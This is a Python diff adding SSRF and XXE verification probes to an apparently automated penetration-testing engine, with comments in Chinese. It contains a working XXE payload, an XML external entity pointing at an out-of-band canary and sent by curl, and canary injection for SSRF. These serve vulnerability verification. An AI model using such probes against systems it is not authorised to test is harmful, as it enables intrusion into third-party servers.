@@ -32,6 +32,7 @@ Stage 1 被动推导（proven→verified / refuted→refuted / inconclusive→�
 """
 from __future__ import annotations
 
+import asyncio
 import logging
 import re
 import secrets
@@ -198,7 +199,8 @@ class Prober:
         replay = (foothold.get("props") or {}).get("replay") or foothold.get("replay") or {}
         ptype = replay.get("probe_type") if isinstance(replay, dict) else None
         probe = {"ssti": self._probe_ssti, "sqli": self._probe_sqli,
-                 "lfi": self._probe_lfi, "open_redirect": self._probe_open_redirect}.get(ptype)
+                 "lfi": self._probe_lfi, "open_redirect": self._probe_open_redirect,
+                 "ssrf": self._probe_ssrf, "xxe": self._probe_xxe}.get(ptype)
         if probe is not None:
             return await probe(foothold, replay)
         return None
@@ -450,6 +452,65 @@ class Prober:
         return ProbeResult(INCONCLUSIVE, "open_redirect", NOISE_LOW,
                            detail="未发生 3xx 重定向 → 无法确定（交兜底）",
                            command=cmd, output=f"status={status}")
+
+    async def _oob_poll(self, token: str, tries: int = 2) -> bool:
+        """经沙箱 curl 查 OOB 监听器该 token 是否被目标回连打中（SSRF 常为同步抓取，先查一次再略等重试）。"""
+        hu = getattr(self.oob, "hits_url", None)
+        if hu is None:
+            return False
+        for i in range(max(1, tries)):
+            _rc, out = await self._run(f"curl -s -m 10 {_q(hu(token))}")
+            if "HIT" in (out or ""):
+                return True
+            if i + 1 < tries:
+                await asyncio.sleep(1.5)
+        return False
+
+    async def _probe_ssrf(self, foothold: dict, replay: dict) -> ProbeResult:
+        """SSRF：给参数注入引擎自选 OOB canary URL——目标真发起带外请求打中 canary 才算证成。
+        未配 OOB / 未命中 → inconclusive（出网可能被过滤，不写反证）。"""
+        if not getattr(self.oob, "available", False):
+            return ProbeResult(INCONCLUSIVE, "ssrf", NOISE_PASSIVE,
+                               detail="未配置 OOB canary（probe.oob_url）→ 无法确定性验证 SSRF，交兜底/LLM-judge",
+                               trust="none")
+        guard = self._web_guard("ssrf")
+        if guard:
+            return guard
+        token, canary = await self.oob.new_token()
+        _status, _h, body, cmd = await self._http(replay, canary)
+        if await self._oob_poll(token):
+            return ProbeResult(PROVEN, "ssrf", NOISE_LOW,
+                               detail=f"目标回连打中引擎 OOB canary（token {token}）→ SSRF 确证",
+                               command=cmd, output=f"OOB HIT token={token}", nonce=token)
+        return ProbeResult(INCONCLUSIVE, "ssrf", NOISE_LOW,
+                           detail="注入 canary 后未见目标回连（出网被过滤 / 非 SSRF）→ unproven（不写反证）",
+                           command=cmd, output=(body or "")[:300], nonce=token)
+
+    async def _probe_xxe(self, foothold: dict, replay: dict) -> ProbeResult:
+        """XXE：提交带外部实体(指向引擎 OOB canary)的 XML——解析器真展开实体回连 canary 才算证成。"""
+        if not getattr(self.oob, "available", False):
+            return ProbeResult(INCONCLUSIVE, "xxe", NOISE_PASSIVE,
+                               detail="未配置 OOB canary（probe.oob_url）→ 无法确定性验证 XXE，交兜底",
+                               trust="none")
+        guard = self._web_guard("xxe")
+        if guard:
+            return guard
+        token, canary = await self.oob.new_token()
+        xml = (f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "{canary}">]><r>&xxe;</r>')
+        url = replay.get("url", "")
+        method = (replay.get("method") or "POST").upper()
+        if not url:
+            return ProbeResult(INCONCLUSIVE, "xxe", NOISE_LOW, detail="replay 缺 url", trust="none")
+        cmd = (f"curl -s -i -m 15 -L -X {_q(method)} {_q(url)} "
+               f"-H 'Content-Type: application/xml' --data {_q(xml)}")
+        await self._run(cmd, timeout=30)
+        if await self._oob_poll(token):
+            return ProbeResult(PROVEN, "xxe", NOISE_LOW,
+                               detail=f"XML 外部实体展开回连 OOB canary（token {token}）→ XXE 确证",
+                               command=cmd, output=f"OOB HIT token={token}", nonce=token)
+        return ProbeResult(INCONCLUSIVE, "xxe", NOISE_LOW,
+                           detail="提交外部实体 XML 后未见回连（实体被禁 / 非 XXE）→ unproven（不写反证）",
+                           command=cmd, nonce=token)
 
     # ========== 凭据探针 ==========
     async def probe_credential(self, cred: dict, traces: list[dict]) -> ProbeResult | None:
